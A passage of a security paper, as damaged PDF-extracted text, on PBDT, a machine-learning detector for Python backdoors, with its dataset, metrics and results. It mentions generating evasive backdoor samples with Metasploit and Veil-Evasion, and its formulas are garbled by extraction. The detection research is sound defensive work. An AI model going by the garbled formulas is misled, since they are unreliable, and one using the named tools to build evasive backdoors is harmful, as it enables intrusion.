value.\\n'e calculation formula is as follows:\\nSecurity and Communication Networks 7\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\ntfi,j \\ufffd\\nni,j\\n\\udbff\\udf50knk,j\\n,\\nidfi \\ufffd lg |D|\\nj: ti \\u2208dj\\udbff\\udf6e \\udbff\\udf6f\\n\\udbff\\udf0c\\udbff\\udf0c\\udbff\\udf0c\\udbff\\udf0c\\udbff\\udf0c\\n\\udbff\\udf0c\\udbff\\udf0c\\udbff\\udf0c\\udbff\\udf0c\\udbff\\udf0c\\n,\\ntfidfi,j \\ufffd tfi,j \\u00d7 idfi.\\n(3)\\nAmong them,ni,j refers to the number of occurrences of\\nthe word i in \\ufb01le j, and the corresponding denominator\\nrepresents the sum of occurrences of all words in \\ufb01lej. |D|\\nreferstothetotalnumberofsamples,andthecorresponding\\ndenominatorindicatesthenumberofdocumentscontaining\\nthe term i. If the term is not in the document, the de-\\nnominator will be zero. Generally, the denominator will be\\nincreased by one in practical applications. 'e main idea\\napplied here is that if a certain phrase appears more fre-\\nquently in a given sample and rarely appears in other\\nsamples, it is considered that the phrase has a greater class\\ndistinction ability.\\nIn order to obtain the local context information of the\\ntext, on the basis of obtaining the full-text opcode sequence,\\nthen-gramgrammarmodelisused tosegmentthesequence\\nand calculate the frequency. 'e basic idea is to perform a\\nsliding window operation of sizen on the text content in\\nbytestoformasequenceofbytefragmentswithawindowof\\nn. Here, n \\ufffd 5 is used to balance the completeness of the\\ninformation expressed by opcode and the e\\ufb00ect of model\\n(Section 4.3.1). 'e \\ufb01rst 50 subsequences are selected for\\ncalculation since the amount of information and model\\nperformance is comprehensively measured. 'e word se-\\nquence\\u2019s information of the backdoor and benign \\ufb01les may\\nbe di\\ufb00erent, so the TF-IDF value is calculated according to\\nthe n-gram segmentation result. 'e opcode feature matrix\\nindicating the importance of the phrase is obtained to\\nidentify the backdoor.\\n3.3.3. FastText Malicious Judgment Features. FastText is a\\nword vector representation and fast text classi\\ufb01cation tool\\nopen-sourcedbyFacebookin 2016 [36].Itprovides asimple\\nand e\\ufb03cient method for text classi\\ufb01cation and representa-\\ntion learning. It can achieve accuracy comparable to deep\\nlearning methods but is many orders of magnitude faster\\nthanitstrainingspeed.'elengthoftheopcodesequenceof\\ndi\\ufb00erent \\ufb01les may be quite inconsistent. 'e \\ufb01xed-length\\nword vector\\u2019s embedding may miss the text\\u2019s critical in-\\nformation or do much useless work that consumes multiple\\ncomputing resources. Using the FastText model\\u2019s prediction\\nresult as a feature is more suitable for this type of data.\\nFastText has two important optimizations, n-gram and\\nhierarchical softmax. 'e model architecture is shown in\\nFigure 2, wherex1 \\u2212 xN represent the n-gram vector in the\\ntext, and the average value of word vector is used as the\\nfeature to predict the speci\\ufb01ed category. 'e value ofn\\nselected here is the same as the previous module; both are 5.\\nN-gram will keep word order information during model\\ntraining. 'e softmax function is often used as an activation\\nfunction in the neural network\\u2019s output layer to normalize\\nthe output value of the neuron to 0-1 interval. Compared\\nwith the standard softmax, which normalizes all categories\\u2019\\nprobabilities,hierarchicalsoftmaxconstructsaHu\\ufb00mantree\\nbased on the probability of the category, which can reduce\\nthecomplexityfromNtologNandsigni\\ufb01cantlyimprovethe\\ne\\ufb03ciencyofmodel.'elabelcategoryoftestsetpredictedby\\nthe FastText model is used as a feature of the backdoor\\u2019s\\njudgment.\\n3.4. Classi\\ufb01er. After integrating all the above features, they\\nare sent to the classi\\ufb01er for model training and sample\\ndetection. Here, a Random Forest classi\\ufb01er is selected. 'is\\nclassi\\ufb01er was \\ufb01rst proposed by Tin Kam Ho of Bell Labo-\\nratories in 1995 [37] and has been widely used since then.\\nRandom Forest is a classi\\ufb01er containing multiple decision\\ntrees,andthemodeofoutputcategoryofasingletreeisused\\nas the \\ufb01nal output. It uses unbiased estimation. 'e model\\nhas a robust generalization ability, and it is insensitive to\\nmissing or outlier values of features. For unbalanced\\ndatasets, it can reduce errors.\\n'is paper selects several classic machine learning\\nmodels, including XGBoost, Naive Bayes (NB), and Support\\nVector Machine (SVM). Compared with the traditional\\nGBDT algorithm, XGBoost supports column sampling,\\nwhich can not only reduce over\\ufb01tting, but also reduce\\ncalculations. Naive Bayes performs well on small-scale data\\nand has a high speed during training, while SVM has ex-\\ncellent generalization ability. 'e above classi\\ufb01ers perform\\nwell in a variety of code classi\\ufb01cation tasks. We conduct\\nperformance comparisons through experiments (Section\\n4.3.3) and \\ufb01nd that the Random Forest has the best clas-\\nsi\\ufb01cation e\\ufb00ect, so we believe this algorithm is suitable for\\nPython backdoor detection.\\n4. Experimental Evaluation\\n'is section will evaluate the e\\ufb00ect of PBDT and prove its\\nbene\\ufb01ts through comparative experiments. First, we used\\ntool generation and network collection methods to obtain\\nmore than 2,000 Python samples. After deleting some low-\\nquality data, we labeled them. 'en, we built a model, used\\nexisting data to evaluate its performance, and compared the\\ndetection e\\ufb00ects of various modules and common algo-\\nrithms.Finally,wecomparedtheperformanceofPBDTwith\\nsome previous detection methods in similar \\ufb01elds on this\\ndataset. Experiments show that PBDT has a better dis-\\ntinguishing ability for Python backdoors.\\n...\\nhidden\\noutput\\nx1 x2 xN-1 xN\\nFigure 2: FastText model architecture.\\n8 Security and Communication Networks\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\n4.1.Dataset. 'ecurrentresearchonmaliciousPythoncode\\nis limited, and there is no relatively comprehensive and\\nauthoritative public dataset. We have extensively collected\\nvarious Python \\ufb01les from the open-source library GitHub,\\nincluding malicious backdoors and benign codes. Together,\\nsince there are few public backdoor samples, we also used\\nsometoolstogeneratethem.Intheend,1,511whitesamples\\nand 515 black samples were obtained. In each experiment,\\nthey are randomly divided into 70% training set and 30%\\ntesting set to avoid the fortuity of results. 'e primary data\\nsources are shown in Table 4.\\n4.1.1. Backdoor Data. 'e backdoor samples are mainly\\ndivided into three categories:\\n(1) First of all, we collected a wide range of GitHub\\nprojects, including webshells, reverse shells, C/S\\nbackdoors written in Python language, and so on.\\n'e collected \\ufb01les were marked in the project in-\\ntroduction and veri\\ufb01ed by manual inspection to be\\nmalicious.\\n(2) Another part of the samples are generated using\\nMetasploit Framework (MSF), an open-source se-\\ncurity vulnerability detection tool with functions\\nincluding the whole penetration testing process. 'e\\nmsfvenom module can generate Trojan programs.\\nWe have obtained part of the rebound shell through\\nthis tool, includingsome samples encoded by base64\\nor containing shellcode.\\n(3) In actual applications, backdoors are mostly obfus-\\ncated. In order to obtain more comprehensive data,\\nweusetheVeil-Evasionanti-virustool,whichcanbe\\nused to generate Metasploit payloads and bypass\\nstandard software detection or killing. Combining\\nthesetwotools,ahigh-qualitysamplethatcanbypass\\nsecurity controls is obtained.\\n4.1.2. Benign Data. 'e benign samples are all obtained\\nfrom GitHub, including the Python code of various basic\\nfunctions.Toensurethedata\\u2019saccuracy,wetrytochoosethe\\nproject with more stars, which shows that the project has a\\nhighdegree ofrecognition.'estandardcode withordinary\\ncommunication function has some functional similarities to\\nthe backdoor, which may cause false positive in practical\\napplications. 'erefore, some samples like this are added to\\nthe benign dataset to ensure the accuracy of \\ufb01nal training\\nmodel\\u2019s classi\\ufb01cation.\\n4.2. Evaluation Index. Choosing appropriate evaluation\\nindicators is the key to the experiment. K-fold cross-vali-\\ndation is a conventional method for model evaluation.\\nGenerally, within a speci\\ufb01c range, the evaluation accuracy\\nwillincreasewiththeKvalueincrease.However,thenumber\\nof datasets in this paper is limited. When the K value is\\nconsiderable, the test samples are small so that the result\\u2019s\\nvalidity cannot be guaranteed. 'erefore, for each type of\\nexperimentdescribedbelow,thedatasetisrandomlydivided\\ninto a training set and testing set at a ratio of 7:3 and re-\\npeated ten times at the same time to calculate the average\\nvalue of each indicator. 'is avoids the fortuity of the ex-\\nperimental results and reduces the number of samples\\u2019\\nimpact.\\n'is paper is a typical two-category problem. 'e\\nsamplewillbedividedintopositiveandnegative,andthere\\nare four possible results, as shown in the confusion matrix\\nin Table 5. 'e horizontal direction is predicted category,\\nand the vertical direction is actual category. In the matrix,\\nTP (true positive) represents the number of correctly\\nclassi\\ufb01ed Python backdoors. FP (false positive) represents\\nthe number of benign samples that are mistaken as\\nbackdoors. TN (true negative) represents the number of\\nbenign samples that are correctly classi\\ufb01ed. Furthermore,\\nFN (false negative) indicates the number of backdoor\\nsamples that are mistaken as non-malicious. Based on the\\nconfusion matrix, this paper uses the following evaluation\\nindicators:\\naccuracy \\ufffd TP+ TN\\nTP+ TN+ FP+ FN,\\nprecision \\ufffd TP\\nTP+ FP,\\nrecall \\ufffd TP\\nTP+ FN,\\nTNR \\ufffd TN\\nFP+ TN,\\nF1 \\ufffd 2\\u00d7 precision\\u00d7 recall\\nprecision+ recall .\\n(4)\\nIn the above indicators, the accuracy represents the\\nproportion of correctly classi\\ufb01ed samples in all samples. 'e\\nprecision represents the probability that the samples pre-\\ndicted to be backdoors are malicious, while the recall rep-\\nresents the proportion of the actual backdoor samples that\\nare correctly predicted (also called TPR, true positive rate).\\nTNR (true negative rate) represents the ratio of correct\\npredictions in actual benign samples, and F1 is the average\\nindex of precision and recall. In addition to the above \\ufb01ve\\nvalues, we also visually compare each algorithm\\u2019s perfor-\\nmance by drawing ROC (receiver operating characteristic)\\ncurves (Section 4.3.2).\\nT able4: Statistics from the main sources of data.\\nType Source\\nBenign\\nhttps://github.com/'eAlgorithms/Python\\nhttps://github.com/Lawouach/WebSocket-for-python\\nhttps://github.com/facert/socket-example\\nhttps://github.com/geekcomputers/Python\\nBackdoor\\nMetasploit generation\\nVeil-Evasion+Metasploit generation\\nhttps://github.com/xl7dev/WebShell/tree/master/\\npython\\nhttps://github.com/JustinTom/Packet-Sni\\ufb03ng-\\nbackdoor\\nSecurity and Communication Networks 9\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\n4.3. Basic Experiment. First, we make experimental selec-\\ntions on the value ofn during the two n-gram processing in\\nSection 3.3. At the same time, in order to verify the e\\ufb00ec-\\ntiveness of each feature, we select various features indi-\\nvidually or remove them from the full features to evaluate\\nthe capability of the model. In terms of classi\\ufb01er selection,\\nwe compare the commonly used machine learning algo-\\nrithms with the Random Forest used in this paper to ensure\\nthat the optimal algorithm is used. In this section\\u2019s exper-\\niments, under the premise of comprehensively considering\\nmodel e\\ufb03ciency and detection accuracy, when training the\\nFastText model, the parameter word vector dimension is\\nselected as 30. Meanwhile, the epochs value is 300, and the\\nnumber of decision trees in the Random Forest is set to 100.\\n4.3.1. Reasonability of n in N-gram. Both FastText and TF-\\nIDF in the feature involve the value ofn in n-gram. We\\ndesign experiments to verify the rationality ofn. When n\\ntakes di\\ufb00erent values, a line graph is drawn for the model\\u2019s\\naccuracy and recall. 'e results are shown in Figure 3.\\nItisfoundthatbothindicatorsmaintainarelativelyhigh\\nlevel whenn \\ufffd 5, indicating that the value ofn in the feature\\nis reasonable. When it is lower, it cannot accurately rep-\\nresent the complete sentence information of the Python\\nopcode. When it is higher, the opcode sequence appears too\\nfew times in the code, son \\ufffd 5 can better represent the\\nPython opcode\\u2019s relevant features.\\n4.3.2. Feature Validity. All features are divided into three\\ncategories here. 'e text\\u2019s statistical features in Section 3.3.2\\nare relatively simple and cannot accurately represent the\\nsample, so the FastText feature in Section 3.3.3 is added to\\nthis category. Since the opcode feature of the malicious\\nfunction line in Section 3.3.3 is based on the suspicious\\nfunction de\\ufb01ned in Section 3.3.1, it is included in the call\\nfeature. 'ree types of call features, text statistics and\\nFastTextfeatures,andfull-textopcodefeaturesareseparately\\nsent to the Random Forest classi\\ufb01er. We simultaneously\\ncombine them for experiments and compare them with all\\nfeatures. 'e experimental results are shown in Table 6.\\nIt can be seen that various features have certain classi-\\n\\ufb01cation e\\ufb00ects, but their performance is limited. After re-\\nmoving any type of features, the classi\\ufb01er\\u2019s various indicators\\nhave declined, indicating that each feature plays an indis-\\npensable role in training the \\ufb01nal model. 'e hybrid features\\nproposed in this paper can better identify the Python back-\\ndoor, with an accuracy of 97.70% and a TNR of 98.66%.\\n4.3.3. Classi\\ufb01er E\\ufb00ectiveness. In order to verify the e\\ufb00ec-\\ntiveness of the algorithm, some classic machine learning\\nalgorithmsthatarewidelyusedinresearchareselected,and\\nthe comprehensive feature\\u2019s training model is used to\\ncompare the performance with the Random Forest clas-\\nsi\\ufb01er. 'e algorithms considered here include XGBoost,\\nNaive Bayes, and Support Vector Machine. In order to\\ncompare the e\\ufb00ects of each model more intuitively, the\\nROC curve of each algorithm during the test is drawn, as\\nshown in Figure 4.\\n'e algorithm\\u2019s e\\ufb00ect can be judged by the graph area\\u2019s\\nsize formed by the ROC curve and thex-axis. 'e graph\\nshows that the Random Forest has the best e\\ufb00ect, followed\\nby XGBoost, Naive Bayes, and Support Vector Machine.\\n'erefore, it can be considered that the Random Forest\\nclassi\\ufb01er has the best applicability in Python backdoor\\ndetection.\\n4.4. Comparative Experiment. To further illustrate the\\nadvantages of PBDT in detecting Python backdoors,\\nseveral representative models are selected for comparison\\nof experimental data. 'ere are very few previous papers\\nabout Python malicious code detection, so we will use\\nwebshell detection-related methods to reproduce the ex-\\nperiment. Moreover, due to the limited dataset, the deep\\nneural network method may cause over\\ufb01tting and cannot\\nachieve better results, so the classic machine learning\\nmodels are used.\\n0.90\\n0.92\\n0.94\\n0.96Rate\\n234 615\\nThe value of in n_gram\\naccuracy\\nrecall\\nFigure 3: Corresponding indicators for di\\ufb00erent values of n.\\nT able5: Confusion matrix.\\nPredict backdoor Predict benign\\nActual backdoor TP FN\\nActual benign FP TN\\nT able 6: Performance comparison of di\\ufb00erent feature\\ncombinations.\\nFeatures Accuracy Precision Recall\\n(TPR) TNR F1-\\nscore\\n#1 Call 0.9342 0.8805 0.8696 0.9575 0.8750\\n#2 Text 0.9391 0.9026 0.8634 0.9664 0.8825\\n#3 Opcode 0.9441 0.8757 0.9193 0.9530 0.8970\\n#1+#2 0.9589 0.9146 0.9317 0.9687 0.9231\\n#1+#3 0.9638 0.9264 0.9379 0.9732 0.9321\\n#2+#3 0.9473 0.8817 0.9255 0.9553 0.9030\\nPBDT #1+#2+#3 0.9770 0.9623 0.9503 0.9866 0.9563\\n10 Security and Communication Networks\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\nFang et al. [22] used FastText to detect webshell. 'e\\nmethod is similar to the synthesis of feature 2 and FastText\\nfeaturesinSection4.3.2.'edi\\ufb00erenceisthatthestatistical\\ntextfeatureofcompressionrateisnotconsidered,and n \\ufffd 4\\nis selected for n-gram value of FastText, whilen \\ufffd 5 is used\\nin this paper. Cui et al. [18] used Random Forest and\\nGradient Boosting Decision Tree comprehensive algo-\\nrithms to distinguish webshells. 'ey also considered six\\ntypes of text statistical features. Besides, they used TF-IDF\\nand Hash, two types of vectors to represent opcode se-\\nquences, and obtained sequence classi\\ufb01cation labels\\nthrough Random Forest classi\\ufb01ers. After synthesizing the\\n\\ufb01rst six types of features, the \\ufb01nal prediction result was\\nobtained through the GBDT classi\\ufb01er. Unlike this paper,\\nTF-IDF represents the frequency of a single character. Guo\\net al. [38] recognized webshell attacks through opcode and\\nalso used TF-IDF to represent text. However, the bi-gram\\nwas used to divide characters, and the \\ufb01nal classi\\ufb01er chose\\nNaive Bayes (the method of the paper below is represented\\nby the author\\u2019s last name).\\nWe use the dataset of this paper to reproduce the above\\nthree experiments, and compare the performance with\\nPBDT. 'e results are shown in Table 7. It should be noted\\nthat most of the parameter selection in the experiment is\\ndescribed in the original text, but some adjustments are\\nmade due to di\\ufb00erent applicable scenarios. For the part\\nrelated to the text\\u2019s statistical characteristics, the \\ufb01rst two\\npapers are aimed at PHP webshells. 'e dangerous char-\\nactersproposedarealsorelatedtothePHPlanguage.Wewill\\nreplacethemwiththePythonbackdoordangerouskeywords\\nlisted in Section 3.2.6. 'e TF-IDF vector dimension chosen\\nby Cui [18] is 146 because it is for a single character, and\\nthereare146typesofopcodesinPHP.'ereare121typesof\\nPython opcodes in this experiment, so the vector dimension\\nis set to 121.\\n'e table\\u2019s data intuitively shows that PBDT is signi\\ufb01-\\ncantly better than the other three solutions. In-depth\\nanalysis,thealgorithmusedbyGuoetal.[38]isNaiveBayes.\\nIn Section 4.3.3, we have compared the algorithms, and the\\nRandom Forest performs better in the classi\\ufb01cation of Py-\\nthon backdoors. Random Forest is a combination of mul-\\ntiple decision trees with strong generalization ability. At the\\nsame time, the risk of over\\ufb01tting is reduced by averaging\\ndecision trees, and it performs well for the classi\\ufb01cation of\\nhigh-dimensionaldata.'eNaiveBayesmodelassumesthat\\nthe attributes are independent of each other, and the clas-\\nsi\\ufb01cation e\\ufb00ect is not good when the number of attributes is\\nrelatively large or the correlation between attributes is rel-\\natively large. 'e classi\\ufb01cation object of this paper is the\\nentire Python \\ufb01le. File sizes and structures vary greatly.\\nDi\\ufb00erent malicious \\ufb01les may have di\\ufb00erent manifestations,\\nand the location of suspicious statements in the code is\\nuncertain. At the same time, the feature dimension used is\\nhigher,andtheinternalcorrelationofsimilarfeaturesisalso\\ngreater. 'erefore, compared with the Naive Bayes used by\\nGuo et al. [38], Random Forest is more suitable for the\\nsample scenario in this paper. Simultaneously, the bi-gram\\nonly expresses the relationship between the adjacent opc-\\nodes, and the opcode to express a complete sentence of\\nPythonlanguage needs\\ufb01veormore,sothen \\ufffd 5used inthis\\npaper can better represent the semantic information of the\\ntext. 'e reason for the signi\\ufb01cantly lower precision of this\\nscheme is the imbalance in the number of positive and\\nnegative samples.\\n'esameistruefortheselectionof n inFangetal.\\u2019s[22]\\nFastText model. We have proved through a lot of experi-\\nments thatn \\ufffd 5 can guarantee the best model performance.\\n'e TF-IDF vector and hash vector in Cui [18] only rep-\\nresentthemappingrelationshipbetweenasingleopcodeand\\nthe vector and do not re\\ufb02ect the contextual connection.\\n'erefore, the classi\\ufb01cation e\\ufb00ect is not excellent. 'e es-\\nsenceofn-gramistodividethesequenceofopcodesintothe\\nsmallest subblocks that can represent code information. It\\ntakes5ormoretoexpressacompletesentenceofopcodesin\\nthe Python language. For example, for the commonly used\\nsocket connection statement \\u201csocket.socket (sock-\\net.AF_INET, socket.SOCK_STREAM)\\u201d in the backdoor, the\\ncorresponding opcode sequence is \\u201c[\\u201cLOAD_NAME\\u201d,\\n\\u201cLOAD_METHOD\\u201d, \\u201cLOAD_NAME\\u201d,\\n\\u201cLOAD_ATTR\\u201d, \\u201cLOAD_NAME\\u201d, \\u201cLOAD_ATTR\\u201d,\\n\\u201cCALL_METHOD\\u201d,\\u201cRETURN_VALUE\\u201d]\\u201d.'e numberof\\nopcodes is 8, and the more parameters in the function call,\\nthe longer the sequence length. Consequently, the value ofn\\nROC Curve\\n0.025 0.050 0.075 0.100 0.1750.150 0.2000.000 0.125\\nFalse Positive Rate\\n0.0\\n0.2\\n0.4\\n0.6\\n0.8\\n1.0True Positive Rate\\nNaive Bayes (auc = 0.94)\\nSupport Vector Machine (auc = 0.97)\\nRandom Forest (auc = 0.99)\\nXGboost (auc = 0.98)\\nFigure 4: ROC curves of di\\ufb00erent algorithms.\\nT able7: Performance comparison with other models.\\nAccuracy Precision Recall\\n(TPR) TNR F1-\\nscore\\nGuo et al.\\n[38] 0.8355 0.6393 0.8696 0.8233 0.7368\\nCui [18] 0.9122 0.8961 0.7565 0.9682 0.8201\\nFang et al.\\n[22] 0.9391 0.8563 0.9255 0.9441 0.8896\\nPBDT 0.9770 0.9623 0.9503 0.9866 0.9563\\nSecurity and Communication Networks 11\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\nshould not be too small. Cui\\u2019s [18] method is similar to the\\nvalue n \\ufffd 1, and Fang et al.\\u2019s [22] method isn \\ufffd 4, neither of\\nwhich can e\\ufb00ectively represent the code semantic infor-\\nmation. 'erefore, the value ofn in this paper is reasonable\\nand e\\ufb00ective for classi\\ufb01cation.\\nIn summary, compared with previous research, PBDT\\ncan better identify malicious Python backdoor.\\n5. Conclusion\\nInordertoensuretheconcealmentofbackdoor,theattacker\\nwill obfuscate and encode the code. Concurrently, the parts\\nof the text that are not related to the function will also a\\ufb00ect\\nthe detection e\\ufb00ect. But the encoding often has apparent\\ncharacteristics,andtheinterferenceitemssuchascomments\\nwill not be compiled. 'is paper proposes and constructs a\\nPython backdoor detection model PBDT, representing the\\ntext through the statistical features caused by obfuscation\\nand the features of opcode sequence in the compilation, and\\nmatchesthesuspiciousmodulesandfunctionsinthecodeas\\nwell. 'e above features can be used for backdoor recog-\\nnition, respectively. However, experiments have proved that\\nthe detection e\\ufb00ect of comprehensive features is the best.\\nWhen using the Random Forest classi\\ufb01er, the accuracy of\\n97.70% and the TNR of 98.66% can be obtained.\\nCompared with the dynamic detection which requires\\nhigh detection environment and the deep learning that\\nconsumes a lot of resources, the static detection scheme\\nbasedonmachinelearningproposedinthispapercanobtain\\nbetterdetectionresultswithlimitedresources.Whatismore,\\nunderthepremisethatthedatasetcontainssomeobfuscated\\nsamples, it has a signi\\ufb01cant performance improvement\\ncomparedwiththepreviouslyproposedwebshell\\u2019sdetection\\nmethod. However, this scheme covers many aspects and has\\nan extensive feature dimension. How to obtain better de-\\ntection performance with limited feature dimensions is a\\ndirection worthy of our future research. At the same time,\\nexploring the characteristics of other programming lan-\\nguage\\u2019s backdoor scripts is also a valuable work. 'e design\\nideaofthispaperisalsoapplicabletoothermaliciousPython\\ncode detection.\\nData Availability\\n'e data used to support the \\ufb01ndings of this study are in-\\ncluded within the article.\\nConflicts of Interest\\n'e authors declare that there are no con\\ufb02icts of interest\\nregarding the publication of this study.\\nAcknowledgments\\n'is paper was supported in part by the National Natural\\nScience Foundation of China (U20B2045) and National Key\\nResearch and Development Program of China (Grant no.\\n2016QY13Z2302).\\nReferences\\n[1] Malwarebytes Labs, \\u201c2020 state of malware report,\\u201d 2020,\\navaible at: https://resources.malwarebytes.com/\\ufb01les/2020/02/\\n2020_State-of-Malwarebytes.Report.pdf.\\n[2] Y.D.Lawrence,D.LiangLee,Y.-H.Chen,andL.XiangYann,\\nLexicalanalysisforthewebshellattacks,\\u201d in Proceedings of the\\n2016 International Symposium On Computer, Consumer And\\nControl (IS3C), pp. 579\\u2013582, IEEE, Xi\\u2019an, China, July 2016.\\n[3] O. Starov, J. Dahse, S. S. Ahmad, T. Holz, and N. Nikiforakis,\\n\\u201cNo honor among thieves: a large-scale analysis of malicious\\nweb shells,\\u201d inProceedings of the 25th International Confer-\\nence on World Wide Web, pp.1021\\u20131032, Montr\\u00b4eal, Canada,\\nApril 2016.\\n[4] C. Wang, H. Yang, Z. Zhao, L. Gong, and Z. Li, \\u201c'e research\\nand improvement in the detection of PHP variable webshell\\nbased oninformation entropy,\\u201dJournal of Computers,vol.28,\\npp. 62\\u201368, 2016.\\n[5] M. Peter and B. V. W. Irwin, \\u201cTowards a PHP webshell\\ntaxonomy using deobfuscation-assisted similarity analysis,\\u201d\\nIEEE, in Proceedings of the 2015 Information Security for\\nSouth Africa (ISSA), pp. 1\\u20138, Johannesburg, South Africa,\\nAugust 2015.\\n[6] H. Zhang, M. Liu, Z. Yue, Z. Xue, Y. Shi, and X. He, \\u201cA PHP\\nandJSP web shelldetection systemwithtext processing based\\non machine learning,\\u201d inProceedings of the 2020 IEEE 19th\\nInternational Conference on Trust, Security and Privacy in\\nComputing and Communications (TrustCom), pp.1584\\u20131591,\\nIEEE, Guangzhou, China, January 2020.\\n[7] Z. Zhang, M. Li, L. Zhu, and X. Li, \\u201cSmartdetect: a smart\\ndetection scheme for malicious web shell codes via ensemble\\nlearning,\\u201d in Proceedings of the International Conference on\\nSmart Computing and Communication, Tokyo, Japan, De-\\ncember 2018.\\n[8] Z. Zhao, Q. Liu, T. Song, Z. Wang, and X. Wu, \\u201cWSLD:\\ndetecting unknown webshell using fuzzy matching and deep\\nlearning,\\u201d inProceedings of the International Conference on\\nInformation and Communications Security, pp. 725\\u2013745,\\nSpringer, Beijing, China, December 2019.\\n[9] D. Canali and D. Balzarotti, \\u201cBehind the scenes of online\\nattacks: an analysis of exploitation behaviors on the web,\\u201d in\\nProceedings of the 20th Annual Network & Distributed System\\nSecurity Symposium (NDSS 2013), San Diego, CA, USA,\\nFebruary 2013.\\n[10] M. Xie and J. Hu, \\u201cEvaluating host-based anomaly detection\\nsystems: a preliminary analysis of adfa-ld,\\u201d inProceedings of\\nthe 2013 6th International Congress on Image and Signal\\nProcessing (CISP), vol. 3, pp. 1711\\u20131716, IEEE, Hangzhou,\\nChina, December 2013.\\n[11] Z.-H. Lv, H.-B. Yan, and R. Mei, \\u201cAutomatic and accurate\\ndetection of webshell based on convolutional neural net-\\nwork,\\u201d in Proceedings of the China Cyber Security Annual\\nConference, pp. 73\\u201385, Springer, Beijing, China, August 2018.\\n[12] Y. Tian, J. Wang, Z. Zhou, and S. Zhou, \\u201cCNN-webshell:\\nmalicious web shell detection with convolutional neural\\nnetwork,\\u201d inProceedings of the 2017 6th International Con-\\nference on Network, Communication and Computing,\\npp. 75\\u201379, Kunming, China, December 2017.\\n[13] Z. Wang, J. Yang, M. Dai, R. Xu, and X. Liang, \\u201cA method of\\ndetecting webshell based on multi-layer perception,\\u201d Aca-\\ndemic Journal of Computing & Information Science,vol.2,p.1,\\n2019.\\n[14] B. Yong,X. Liu, Y. Liu, H. Yin, L. Huang, andQ. Zhou, \\u201cWeb\\nbehavior detection based on deep neural network,\\u201d in\\n12 Security and Communication Networks\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\nProceedings of the 2018 IEEE SmartWorld, Ubiquitous Intel-\\nligence & Computing, Advanced & Trusted Computing,\\nScalable Computing & Communications, Cloud & Big Data\\nComputing, Internet of People and Smart City Innovation\\n(SmartWorld/SCALCOM/UIC/ATC/CBDCom/IOP/SCI),\\npp. 1911\\u20131916, IEEE, Guangzhou, China, October 2018.\\n[15] S. L. 'omas and A. Francillon, \\u201cBackdoors: de\\ufb01nition, de-\\nniability and detection,\\u201d inProceedings of the 25th Interna-\\ntional Symposium on Research in Attacks, Intrusions, and\\nDefenses, pp. 92\\u2013113, Springer, Heraklion, Greece, September\\n2018.\\n[16] B. Scott and B. Hagen, \\u201cWeb shell detection using NeoPI,\\u201d\\n2011, https://resources.infosecinstitute.com/topic/web-shell-\\ndetection/.\\n[17] A. Fass, M. Backes, and B. Stock, \\u201cJStap: a static pre-\\ufb01lter for\\nmalicious javascript detection,\\u201d in Proceedings of the 35th\\nAnnual Computer Security Applications Conference, pp. 257\\u2013\\n269, San Juan, PR, USA, December 2019.\\n[18] H.Cui,\\u201cWebshelldetectionbasedonrandomforest\\u2013gradient\\nboosting decision tree algorithm,\\u201d inProceedings of the IEEE\\n3rd International Conference on Data Science in Cyberspace\\n(DSC), June 2018.\\n[19] J.Wang,Y. Xue,Y.Liu,andH.Tian,\\u201cJsdc:ahybridapproach\\nfor javascript malware detection and classi\\ufb01cation,\\u201d inPro-\\nceedings of the 10th ACM Symposium on Information,\\nComputer and Communications Security, pp. 109\\u2013120, Sin-\\ngapore, April 2015.\\n[20] T. D. Tu, G. Cheng, X. Guo, and W. Pan, \\u201cWebshell detection\\ntechniques in web applications,\\u201d in Proceedings of the 5th\\nInternational Conference on Computing, Communications and\\nNetworking Technologies (ICCCNT), pp. 1\\u20137, IEEE, Hefei,\\nChina, July 2014.\\n[21] I. A. Al-Taharwa, H.-M. Lee, A. Jeng, K. Wu, C. Ho, and\\nS.Chen,\\u201cJSOD:javascriptobfuscationdetector,\\u201d Security and\\nCommunication Networks, vol. 8, no. 6, pp. 1092\\u20131107, 2015.\\n[22] Y. Fang, Y. Qiu, L. Liu, and C. Huang, \\u201cDetecting webshell\\nbased on random forest with fasttext,\\u201d inProceedings of the\\n2018 International Conference on Computing and Arti\\ufb01cial\\nIntelligence, pp. 52\\u201356, Chengdu China, March 2018.\\n[23] Z. Pan, Y. Chen, Y. Chen, Y. Shen, and X. Guo, \\u201cWebshell\\ndetection based on executable data characteristics of PHP\\ncode,\\u201dWireless communications and mobile computing,\\nvol. 2021, Article ID 5533963, 12 pages, 2021.\\n[24] Y.Wu,Y.Ma,andS.Wan,\\u201cMulti-scalerelationreasoningfor\\nmulti-modal visual question answering,\\u201d Signal Processing:\\nImage Communication, vol. 96, Article ID 116319, 2021.\\n[25] S. Ding, S. Qu, Y. Xi, and S. Wan, \\u201cStimulus-driven and\\nconcept-driven analysis for image caption generation,\\u201d\\nNeurocomputing, vol. 398, pp. 520\\u2013530, 2020.\\n[26] S. 